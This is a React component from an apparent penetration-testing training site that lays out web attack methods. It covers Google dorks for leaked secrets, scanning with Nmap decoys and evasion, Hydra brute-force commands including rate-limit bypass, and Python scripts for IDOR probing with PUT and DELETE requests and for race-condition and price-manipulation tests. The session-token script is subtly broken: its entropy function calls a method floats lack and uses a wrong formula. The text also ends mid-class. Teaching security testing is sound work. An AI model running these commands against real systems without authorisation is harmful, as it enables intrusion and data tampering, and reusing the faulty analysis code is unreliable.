
import React from 'react';
import { Search, Shield, Bug, Zap, Code, Terminal, Eye, Lock } from 'lucide-react';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import CodeExample from '@/components/CodeExample';

const TestingTechniquesSection: React.FC = () => {
  return (
    <section className="space-y-8">
      <div className="text-center mb-12">
        <h2 className="text-3xl font-bold mb-4 text-cybr-primary">Professional Testing Techniques</h2>
        <p className="text-lg opacity-80 max-w-4xl mx-auto">
          Comprehensive methodologies, tools, and techniques for conducting thorough web application security assessments
          following industry standards and best practices.
        </p>
      </div>

      <Accordion type="multiple" className="space-y-4">
        {/* Reconnaissance and Information Gathering */}
        <AccordionItem value="reconnaissance" className="border border-cybr-muted/30 rounded-lg px-6">
          <AccordionTrigger className="hover:no-underline">
            <div className="flex items-center gap-3">
              <Search className="h-6 w-6 text-cybr-primary" />
              <span className="text-xl font-semibold">Reconnaissance and Information Gathering</span>
            </div>
          </AccordionTrigger>
          <AccordionContent className="pt-6 space-y-6">
            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">OSINT (Open Source Intelligence) Gathering</h4>
              <p className="mb-4">
                Open Source Intelligence gathering is the foundation of any penetration test. It involves collecting 
                publicly available information about the target organization, infrastructure, and personnel.
              </p>
              
              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Popular OSINT Tools</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Google Dorking:</strong> Advanced search operators for finding sensitive information</li>
                    <li><strong>Shodan:</strong> Search engine for Internet-connected devices</li>
                    <li><strong>theHarvester:</strong> Email and subdomain enumeration</li>
                    <li><strong>Maltego:</strong> Link analysis and data mining</li>
                    <li><strong>Recon-ng:</strong> Full-featured reconnaissance framework</li>
                    <li><strong>SpiderFoot:</strong> Automated OSINT collection</li>
                    <li><strong>FOCA:</strong> Metadata extraction from documents</li>
                    <li><strong>Sherlock:</strong> Username enumeration across platforms</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Information Sources</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>DNS Records:</strong> Subdomains, mail servers, infrastructure</li>
                    <li><strong>Social Media:</strong> Employee information, technology stack</li>
                    <li><strong>Job Postings:</strong> Technologies, security measures</li>
                    <li><strong>Code Repositories:</strong> GitHub, GitLab for exposed secrets</li>
                    <li><strong>Certificate Transparency:</strong> SSL certificates and subdomains</li>
                    <li><strong>Archive.org:</strong> Historical website data</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Google Dorking Examples"
                code={`# Find admin panels
site:example.com inurl:admin
site:example.com inurl:administrator
site:example.com intitle:"admin panel"

# Configuration files
site:example.com filetype:xml | filetype:conf | filetype:cnf
site:example.com ext:cfg | ext:env | ext:ini

# Database files
site:example.com filetype:sql | filetype:dbf | filetype:mdb
site:example.com inurl:backup
site:example.com "phpMyAdmin" "running on"

# Sensitive information
site:example.com "password" | "passwd" | "pwd"
site:example.com "api_key" | "apikey" | "api-key"
site:example.com "secret_key" | "access_token"

# Error messages and debug info
site:example.com "error" | "exception" | "warning"
site:example.com "stack trace" | "debug"
site:example.com "database error" | "mysql error"`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Subdomain Enumeration</h4>
              <p className="mb-4">
                Subdomain enumeration is crucial for discovering additional attack surfaces. Many organizations 
                have forgotten or poorly secured subdomains that can provide entry points into their infrastructure.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Active Enumeration Tools</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Amass:</strong> Advanced DNS enumeration and mapping</li>
                    <li><strong>Subfinder:</strong> Fast passive subdomain discovery</li>
                    <li><strong>Assetfinder:</strong> Quick asset discovery</li>
                    <li><strong>Sublist3r:</strong> Multi-source enumeration</li>
                    <li><strong>Knock:</strong> Wordlist-based discovery</li>
                    <li><strong>DNSRecon:</strong> Comprehensive DNS enumeration</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Passive Enumeration Sources</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Certificate Transparency:</strong> crt.sh, censys.io</li>
                    <li><strong>DNS Aggregators:</strong> SecurityTrails, PassiveTotal</li>
                    <li><strong>Search Engines:</strong> Google, Bing, Yahoo</li>
                    <li><strong>Archive Analysis:</strong> Wayback Machine</li>
                    <li><strong>Code Repositories:</strong> GitHub, GitLab searches</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Subdomain Enumeration Commands"
                code={`# Amass - Comprehensive subdomain enumeration
amass enum -d example.com
amass enum -d example.com -brute -w /path/to/wordlist.txt
amass enum -d example.com -src -ip -dir /path/to/output

# Subfinder - Fast passive discovery
subfinder -d example.com
subfinder -d example.com -o subdomains.txt
subfinder -d example.com -silent | httpx -silent

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# DNS Brute Force
gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/fierce-hostlist.txt
fierce --domain example.com --subdomains /path/to/wordlist.txt

# Combining tools for comprehensive discovery
echo "example.com" | subfinder -silent | assetfinder --subs-only | sort -u`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Technology Stack Identification</h4>
              <p className="mb-4">
                Understanding the target's technology stack helps prioritize testing efforts and identify 
                specific vulnerabilities associated with particular technologies.
              </p>

              <div className="grid md:grid-cols-3 gap-4 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Web Technology Detection</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Wappalyzer</li>
                    <li>BuiltWith</li>
                    <li>WhatWeb</li>
                    <li>Netcraft</li>
                    <li>Retire.js</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Fingerprinting Techniques</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>HTTP Headers</li>
                    <li>Error Messages</li>
                    <li>Default Pages</li>
                    <li>Cookie Analysis</li>
                    <li>JavaScript Libraries</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Server Information</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Web Server Type</li>
                    <li>Framework Version</li>
                    <li>Database Platform</li>
                    <li>CDN Services</li>
                    <li>Security Headers</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Technology Detection Commands"
                code={`# WhatWeb - Technology identification
whatweb example.com
whatweb -v example.com
whatweb --color=never --no-errors -a 3 -v example.com

# Wappalyzer CLI
wappalyzer https://example.com

# Nmap HTTP scripts for technology detection
nmap --script http-enum,http-headers,http-methods,http-title example.com
nmap --script http-waf-detect,http-waf-fingerprint example.com

# Manual header analysis
curl -I https://example.com
curl -s -D - https://example.com -o /dev/null

# SSL/TLS analysis
nmap --script ssl-enum-ciphers -p 443 example.com
testssl.sh https://example.com`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Port Scanning and Service Discovery</h4>
              <p className="mb-4">
                Port scanning identifies open services and potential entry points. Modern applications 
                often run on non-standard ports or have additional services that aren't immediately visible.
              </p>

              <CodeExample
                language="bash"
                title="Advanced Nmap Scanning Techniques"
                code={`# Basic TCP Connect Scan
nmap -sT -p- example.com

# SYN Stealth Scan (requires root)
nmap -sS -p- example.com

# Service Version Detection
nmap -sV -p- example.com

# Aggressive scan with OS detection
nmap -A example.com

# UDP Scan (top 1000 ports)
nmap -sU --top-ports 1000 example.com

# Script Scanning
nmap --script=default example.com
nmap --script=vuln example.com
nmap --script=auth example.com

# Timing and Stealth
nmap -T2 example.com  # Polite scan
nmap -T4 example.com  # Aggressive scan

# Firewall Evasion
nmap -f example.com  # Fragment packets
nmap -D decoy1,decoy2,ME example.com  # Decoy scan
nmap --source-port 53 example.com  # Source port manipulation

# Web-specific Scripts
nmap --script http-enum example.com
nmap --script http-headers example.com
nmap --script http-methods example.com
nmap --script ssl-enum-ciphers example.com`}
              />
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Vulnerability Scanning */}
        <AccordionItem value="vulnerability-scanning" className="border border-cybr-muted/30 rounded-lg px-6">
          <AccordionTrigger className="hover:no-underline">
            <div className="flex items-center gap-3">
              <Shield className="h-6 w-6 text-cybr-primary" />
              <span className="text-xl font-semibold">Automated Vulnerability Scanning</span>
            </div>
          </AccordionTrigger>
          <AccordionContent className="pt-6 space-y-6">
            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Web Application Scanners</h4>
              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Commercial Scanners</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Burp Suite Professional:</strong> Industry standard with extensive features</li>
                    <li><strong>Acunetix:</strong> High accuracy with modern web app support</li>
                    <li><strong>Nessus:</strong> Comprehensive vulnerability management</li>
                    <li><strong>Qualys VMDR:</strong> Cloud-based scanning platform</li>
                    <li><strong>Rapid7 InsightAppSec:</strong> DevSecOps integration</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Open Source Tools</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>OWASP ZAP:</strong> Free security testing proxy</li>
                    <li><strong>Nikto:</strong> Web server scanner</li>
                    <li><strong>Nuclei:</strong> Fast vulnerability scanner</li>
                    <li><strong>Wfuzz:</strong> Web application fuzzer</li>
                    <li><strong>SQLMap:</strong> SQL injection testing tool</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="OWASP ZAP Automation"
                code={`# ZAP Baseline Scan
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com

# ZAP Full Scan
docker run -t owasp/zap2docker-stable zap-full-scan.py -t https://example.com

# ZAP API Scan
docker run -t owasp/zap2docker-stable zap-api-scan.py -t https://example.com/api/openapi.json

# ZAP with custom configuration
zap.sh -cmd -quickurl https://example.com -quickprogress -quickout /path/to/report.html

# ZAP daemon mode for API access
zap.sh -daemon -host 0.0.0.0 -port 8080 -config api.addrs.addr.name=.* -config api.addrs.addr.regex=true`}
              />

              <CodeExample
                language="bash"
                title="Nikto Web Server Scanning"
                code={`# Basic Nikto scan
nikto -h https://example.com

# Comprehensive scan with all plugins
nikto -h https://example.com -Plugins @@ALL

# Scan with custom port
nikto -h https://example.com -p 8080,8443

# Save results to file
nikto -h https://example.com -o report.html -Format htm

# Scan multiple hosts
nikto -h https://example.com,https://test.example.com

# Use custom User-Agent
nikto -h https://example.com -useragent "Custom Scanner 1.0"

# Scan with proxy
nikto -h https://example.com -useproxy http://proxy:8080`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Advanced Fuzzing Techniques</h4>
              <p className="mb-4">
                Fuzzing involves sending unexpected, random, or malformed data to application inputs 
                to discover vulnerabilities, crashes, or unexpected behaviors.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Fuzzing Tools</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>FFuF:</strong> Fast web fuzzer written in Go</li>
                    <li><strong>Gobuster:</strong> Directory/file brute-forcer</li>
                    <li><strong>Wfuzz:</strong> Web application fuzzer</li>
                    <li><strong>Burp Intruder:</strong> Payload-based testing</li>
                    <li><strong>OWASP ZAP Fuzzer:</strong> Built-in fuzzing capabilities</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Fuzzing Targets</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Parameters:</strong> GET/POST parameters</li>
                    <li><strong>Headers:</strong> HTTP headers and values</li>
                    <li><strong>Cookies:</strong> Session and tracking cookies</li>
                    <li><strong>File Uploads:</strong> File types and content</li>
                    <li><strong>APIs:</strong> REST/GraphQL endpoints</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="FFuF - Fast Web Fuzzer"
                code={`# Directory fuzzing
ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ

# File extension fuzzing
ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ.php

# Parameter fuzzing (GET)
ffuf -w /path/to/wordlist.txt -u "https://example.com/search?FUZZ=test"

# Parameter fuzzing (POST)
ffuf -w /path/to/wordlist.txt -X POST -d "FUZZ=test" -u https://example.com/login

# Header fuzzing
ffuf -w /path/to/wordlist.txt -H "X-Custom-Header: FUZZ" -u https://example.com

# Multiple wordlists
ffuf -w users.txt:FUZZUSER -w passwords.txt:FUZZPASS -X POST -d "username=FUZZUSER&password=FUZZPASS" -u https://example.com/login

# Filter responses by status code
ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -fc 404

# Filter by response size
ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -fs 1234

# Rate limiting
ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -rate 100`}
              />

              <CodeExample
                language="bash"
                title="Gobuster Directory Enumeration"
                code={`# Basic directory enumeration
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# File extension enumeration
gobuster dir -u https://example.com -w /path/to/wordlist.txt -x php,html,js,txt

# DNS subdomain enumeration
gobuster dns -d example.com -w /path/to/subdomains.txt

# Virtual host enumeration
gobuster vhost -u https://example.com -w /path/to/vhosts.txt

# Custom headers and cookies
gobuster dir -u https://example.com -w /path/to/wordlist.txt -H "Authorization: Bearer token"

# Proxy usage
gobuster dir -u https://example.com -w /path/to/wordlist.txt -p http://127.0.0.1:8080

# Custom User-Agent
gobuster dir -u https://example.com -w /path/to/wordlist.txt -a "Custom-Agent/1.0"

# Recursive enumeration
gobuster dir -u https://example.com -w /path/to/wordlist.txt -r`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Content Discovery</h4>
              <p className="mb-4">
                Content discovery involves finding hidden directories, files, and endpoints that aren't 
                linked from the main application but may contain sensitive information or functionality.
              </p>

              <div className="grid md:grid-cols-3 gap-4 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Discovery Tools</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Dirbuster</li>
                    <li>Dirb</li>
                    <li>Feroxbuster</li>
                    <li>DirSearch</li>
                    <li>Katana</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Common Targets</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>Admin panels</li>
                    <li>Backup files</li>
                    <li>Configuration files</li>
                    <li>Log files</li>
                    <li>Database dumps</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Wordlists</h5>
                  <ul className="list-disc pl-6 space-y-1 text-sm">
                    <li>SecLists</li>
                    <li>FuzzDB</li>
                    <li>Dirbuster lists</li>
                    <li>Custom wordlists</li>
                    <li>Technology-specific</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Content Discovery Commands"
                code={`# Feroxbuster - Fast content discovery
feroxbuster -u https://example.com -w /path/to/wordlist.txt

# Recursive scanning with depth limit
feroxbuster -u https://example.com -w /path/to/wordlist.txt -d 3

# Multiple extensions
feroxbuster -u https://example.com -w /path/to/wordlist.txt -x php,html,js,txt

# DirSearch - Web path scanner
dirsearch -u https://example.com -w /path/to/wordlist.txt

# Recursive directory search
dirsearch -u https://example.com -w /path/to/wordlist.txt -r

# Custom extensions and status codes
dirsearch -u https://example.com -e php,html,js -i 200,301,302

# Katana - Next-generation crawler
katana -u https://example.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault

# LinkFinder - JavaScript endpoint discovery
python linkfinder.py -i https://example.com -o cli

# GAU - Get All URLs
echo "example.com" | gau | sort -u`}
              />
            </div>
          </AccordionContent>
        </AccordionItem>

        {/* Manual Testing Methodologies */}
        <AccordionItem value="manual-testing" className="border border-cybr-muted/30 rounded-lg px-6">
          <AccordionTrigger className="hover:no-underline">
            <div className="flex items-center gap-3">
              <Eye className="h-6 w-6 text-cybr-primary" />
              <span className="text-xl font-semibold">Manual Testing Methodologies</span>
            </div>
          </AccordionTrigger>
          <AccordionContent className="pt-6 space-y-6">
            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Session Management Testing</h4>
              <p className="mb-4">
                Session management vulnerabilities can lead to account takeover, privilege escalation, 
                and unauthorized access. Thorough testing of session handling is critical.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Session Token Analysis</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Randomness Testing:</strong> Entropy analysis, pattern detection</li>
                    <li><strong>Token Scope:</strong> Domain restrictions, path limitations</li>
                    <li><strong>Lifecycle Management:</strong> Creation, renewal, expiration</li>
                    <li><strong>Concurrent Sessions:</strong> Multiple login handling</li>
                    <li><strong>Session Fixation:</strong> Pre/post-authentication validation</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Common Test Cases</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Cookie Security:</strong> HttpOnly, Secure, SameSite flags</li>
                    <li><strong>Session Timeout:</strong> Idle and absolute timeouts</li>
                    <li><strong>Logout Functionality:</strong> Proper session termination</li>
                    <li><strong>Session Hijacking:</strong> Token theft scenarios</li>
                    <li><strong>CSRF Protection:</strong> Cross-site request forgery prevention</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="python"
                title="Session Token Analysis Script"
                code={`#!/usr/bin/env python3
import requests
import base64
import hashlib
import statistics
from collections import Counter

def analyze_session_tokens(login_url, credentials, num_samples=100):
    """Analyze session token randomness and patterns"""
    
    tokens = []
    session = requests.Session()
    
    # Collect multiple session tokens
    for i in range(num_samples):
        # Login to get new session token
        response = session.post(login_url, data=credentials)
        
        # Extract session token (adjust based on application)
        token = None
        if 'Set-Cookie' in response.headers:
            for cookie in response.headers['Set-Cookie'].split(';'):
                if 'sessionid=' in cookie or 'PHPSESSID=' in cookie:
                    token = cookie.split('=')[1]
                    break
        
        if token:
            tokens.append(token)
        
        # Logout to clear session
        session.get('/logout')
    
    # Analyze tokens
    print(f"Collected {len(tokens)} session tokens")
    
    # Check for patterns
    token_lengths = [len(token) for token in tokens]
    print(f"Token length: min={min(token_lengths)}, max={max(token_lengths)}, avg={statistics.mean(token_lengths):.2f}")
    
    # Character frequency analysis
    all_chars = ''.join(tokens)
    char_freq = Counter(all_chars)
    print(f"Character frequency analysis:")
    for char, freq in char_freq.most_common(10):
        print(f"  '{char}': {freq} ({freq/len(all_chars)*100:.2f}%)")
    
    # Check for sequential patterns
    sequential_count = 0
    for i in range(len(tokens)-1):
        if is_sequential(tokens[i], tokens[i+1]):
            sequential_count += 1
    
    print(f"Sequential patterns: {sequential_count}/{len(tokens)-1} ({sequential_count/(len(tokens)-1)*100:.2f}%)")
    
    # Entropy calculation (simplified)
    entropy = calculate_entropy(all_chars)
    print(f"Estimated entropy: {entropy:.2f}")

def is_sequential(token1, token2):
    """Check if tokens appear sequential"""
    try:
        # Convert hex to int and compare
        val1 = int(token1, 16)
        val2 = int(token2, 16)
        return abs(val1 - val2) == 1
    except ValueError:
        return False

def calculate_entropy(data):
    """Calculate Shannon entropy"""
    char_counts = Counter(data)
    total_chars = len(data)
    entropy = 0
    
    for count in char_counts.values():
        probability = count / total_chars
        entropy -= probability * (probability.bit_length() - 1)
    
    return entropy

# Usage example
credentials = {"username": "testuser", "password": "testpass"}
analyze_session_tokens("https://example.com/login", credentials)`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Authentication Testing</h4>
              <p className="mb-4">
                Authentication mechanisms must be thoroughly tested to identify bypass techniques, 
                brute force vulnerabilities, and credential handling issues.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Authentication Bypass Techniques</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>SQL Injection:</strong> Login bypass via injection</li>
                    <li><strong>NoSQL Injection:</strong> MongoDB authentication bypass</li>
                    <li><strong>LDAP Injection:</strong> Directory service bypass</li>
                    <li><strong>Parameter Pollution:</strong> HTTP parameter precedence</li>
                    <li><strong>Race Conditions:</strong> Timing-based attacks</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Password Security Testing</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Brute Force:</strong> Rate limiting effectiveness</li>
                    <li><strong>Dictionary Attacks:</strong> Common password testing</li>
                    <li><strong>Password Policy:</strong> Complexity requirements</li>
                    <li><strong>Account Lockout:</strong> Lockout thresholds and timing</li>
                    <li><strong>Password Reset:</strong> Reset mechanism security</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="bash"
                title="Authentication Testing with Hydra"
                code={`# HTTP POST form brute force
hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# HTTP Basic Authentication
hydra -l admin -P /path/to/passwords.txt example.com http-get /admin

# SSH brute force
hydra -l root -P /path/to/passwords.txt ssh://example.com

# FTP brute force
hydra -l anonymous -P /path/to/passwords.txt ftp://example.com

# MySQL brute force
hydra -l root -P /path/to/passwords.txt mysql://example.com

# Custom failure detection
hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=Access denied"

# Multiple usernames and passwords
hydra -L /path/to/users.txt -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Rate limiting bypass
hydra -l admin -P /path/to/passwords.txt -t 1 -W 5 example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Authorization Testing</h4>
              <p className="mb-4">
                Authorization flaws can allow users to access resources or perform actions beyond 
                their intended privileges. Testing must cover both vertical and horizontal privilege escalation.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Access Control Testing</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Vertical Escalation:</strong> User to admin privilege gain</li>
                    <li><strong>Horizontal Escalation:</strong> Access to other users' data</li>
                    <li><strong>Function-Level Access:</strong> Administrative function access</li>
                    <li><strong>Direct Object Reference:</strong> IDOR vulnerabilities</li>
                    <li><strong>Method-Level Security:</strong> HTTP method restrictions</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Testing Methodology</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Role Matrix:</strong> Map roles to functions</li>
                    <li><strong>Privilege Enumeration:</strong> Identify available functions</li>
                    <li><strong>Cross-User Testing:</strong> Access other users' resources</li>
                    <li><strong>Parameter Manipulation:</strong> Modify IDs and references</li>
                    <li><strong>URL Manipulation:</strong> Direct URL access testing</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="python"
                title="IDOR Testing Script"
                code={`#!/usr/bin/env python3
import requests
import json
from urllib.parse import urlparse, parse_qs, urlencode

class IDORTester:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.update(session_cookie)
    
    def test_numeric_idor(self, endpoint, param_name, start_id=1, end_id=100):
        """Test for numeric IDOR vulnerabilities"""
        print(f"Testing numeric IDOR on {endpoint} parameter {param_name}")
        
        vulnerable_ids = []
        
        for user_id in range(start_id, end_id + 1):
            # Construct URL with modified parameter
            test_url = f"{self.base_url}{endpoint}"
            params = {param_name: user_id}
            
            try:
                response = self.session.get(test_url, params=params)
                
                # Check for successful access (customize based on application)
                if response.status_code == 200 and "access denied" not in response.text.lower():
                    print(f"  [+] Accessible ID: {user_id}")
                    vulnerable_ids.append(user_id)
                elif response.status_code == 403:
                    print(f"  [-] Forbidden ID: {user_id}")
                else:
                    print(f"  [?] ID {user_id}: Status {response.status_code}")
                    
            except requests.exceptions.RequestException as e:
                print(f"  [!] Error testing ID {user_id}: {e}")
        
        return vulnerable_ids
    
    def test_uuid_idor(self, endpoint, param_name, uuid_list):
        """Test for UUID-based IDOR vulnerabilities"""
        print(f"Testing UUID IDOR on {endpoint} parameter {param_name}")
        
        vulnerable_uuids = []
        
        for uuid in uuid_list:
            test_url = f"{self.base_url}{endpoint}"
            params = {param_name: uuid}
            
            try:
                response = self.session.get(test_url, params=params)
                
                if response.status_code == 200:
                    print(f"  [+] Accessible UUID: {uuid}")
                    vulnerable_uuids.append(uuid)
                    
            except requests.exceptions.RequestException as e:
                print(f"  [!] Error testing UUID {uuid}: {e}")
        
        return vulnerable_uuids
    
    def test_api_idor(self, api_endpoint, id_parameter, test_ids):
        """Test for IDOR in API endpoints"""
        print(f"Testing API IDOR on {api_endpoint}")
        
        results = {}
        
        for test_id in test_ids:
            # Test GET request
            get_url = f"{self.base_url}{api_endpoint}/{test_id}"
            
            try:
                response = self.session.get(get_url)
                results[test_id] = {
                    'GET': {
                        'status': response.status_code,
                        'accessible': response.status_code == 200
                    }
                }
                
                if response.status_code == 200:
                    print(f"  [+] GET access to ID {test_id}")
                
                # Test PUT request (if applicable)
                put_data = {"test": "data"}
                put_response = self.session.put(get_url, json=put_data)
                results[test_id]['PUT'] = {
                    'status': put_response.status_code,
                    'accessible': put_response.status_code in [200, 201, 204]
                }
                
                if put_response.status_code in [200, 201, 204]:
                    print(f"  [+] PUT access to ID {test_id}")
                
                # Test DELETE request (if applicable)
                delete_response = self.session.delete(get_url)
                results[test_id]['DELETE'] = {
                    'status': delete_response.status_code,
                    'accessible': delete_response.status_code in [200, 204]
                }
                
                if delete_response.status_code in [200, 204]:
                    print(f"  [+] DELETE access to ID {test_id}")
                    
            except requests.exceptions.RequestException as e:
                print(f"  [!] Error testing ID {test_id}: {e}")
        
        return results

# Usage example
session_cookies = {'sessionid': 'your_session_token_here'}
tester = IDORTester("https://example.com", session_cookies)

# Test numeric IDOR
tester.test_numeric_idor("/user/profile", "id", 1, 50)

# Test UUID IDOR
uuid_list = ["123e4567-e89b-12d3-a456-426614174000", "another-uuid-here"]
tester.test_uuid_idor("/document/view", "doc_id", uuid_list)

# Test API IDOR
tester.test_api_idor("/api/users", "id", range(1, 20))`}
              />
            </div>

            <div className="mb-8">
              <h4 className="text-lg font-semibold mb-4">Business Logic Testing</h4>
              <p className="mb-4">
                Business logic vulnerabilities exploit the intended functionality of an application 
                in unintended ways. These flaws often require deep understanding of the application's purpose.
              </p>

              <div className="grid md:grid-cols-2 gap-6 mb-6">
                <div>
                  <h5 className="font-semibold mb-3">Common Logic Flaws</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Workflow Bypass:</strong> Skipping required steps</li>
                    <li><strong>Process Manipulation:</strong> Altering intended sequences</li>
                    <li><strong>Quantity Manipulation:</strong> Negative or excessive values</li>
                    <li><strong>Price Manipulation:</strong> Discount stacking, currency issues</li>
                    <li><strong>Time Manipulation:</strong> Process timing abuse</li>
                  </ul>
                </div>
                <div>
                  <h5 className="font-semibold mb-3">Testing Approach</h5>
                  <ul className="list-disc pl-6 space-y-2 text-sm">
                    <li><strong>Process Mapping:</strong> Understand intended workflows</li>
                    <li><strong>Edge Case Testing:</strong> Boundary value analysis</li>
                    <li><strong>State Manipulation:</strong> Alter application state</li>
                    <li><strong>Concurrent Testing:</strong> Race condition exploitation</li>
                    <li><strong>Parameter Tampering:</strong> Modify hidden parameters</li>
                  </ul>
                </div>
              </div>

              <CodeExample
                language="python"
                title="Business Logic Testing Example"
                code={`#!/usr/bin/env python3
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class BusinessLogicTester:
    def __init__(self, base_url, session_token):
        self.base_url = base_url
        self.session_token = session_token
        self.headers = {
            'Authorization': f'Bearer {session_token}',
            'Content-Type': 'application/json'
        }
    
    def test_race_condition(self, endpoint, payload, num_threads=10):
        """Test for race conditions in critical operations"""
        print(f"Testing race condition on {endpoint}")
        
        results = []
        
        def make_request():
            try:
                response = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers=self.headers
                )
                results.append({
                    'status_code': response.status_code,
                    'response': response.text[:200],  # First 200 chars
                    'timestamp': time.time()
                })
            except Exception as e:
                results.append({'error': str(e)})
        
        # Execute concurrent requests
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(make_request) for _ in range(num_threads)]
            
            # Wait for all requests to complete
            for future in futures:
                future.result()
        
        # Analyze results
        success_count = sum(1 for r in results if r.get('status_code') == 200)
        print(f"  Successful requests: {success_count}/{num_threads}")
        
        if success_count > 1:
            print("  [!] Potential race condition detected!")
        
        return results
    
    def test_price_manipulation(self, product_id, original_price):
        """Test for price manipulation vulnerabilities"""
        print(f"Testing price manipulation for product {product_id}")
        
        test_cases = [
            {'price': -1, 'description': 'Negative price'},
            {'price': 0, 'description': 'Zero price'},
            {'price': 0.01, 'description': 'Minimal price'},
            {'price': original_price * 0.1, 'description': '90% discount'},
            {'price': original_price * 10, 'description': '1000% markup (for reverse check)'}
        ]
        
        for test_case in test_cases:
            payload = {
                'product_id': product_id,
                'price': test_case['price'],
                'quantity': 1
            }
            
            try:
                response = requests.post(
                    f"{self.base_url}/cart/add",
                    json=payload,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    print(f"  [+] {test_case['description']}: Accepted")
                else:
                    print(f"  [-] {test_case['description']}: Rejected ({response.status_code})")
                    
            except Exception as e:
                print(f"  [!] Error testing {test_case['description']}: {e}")
    
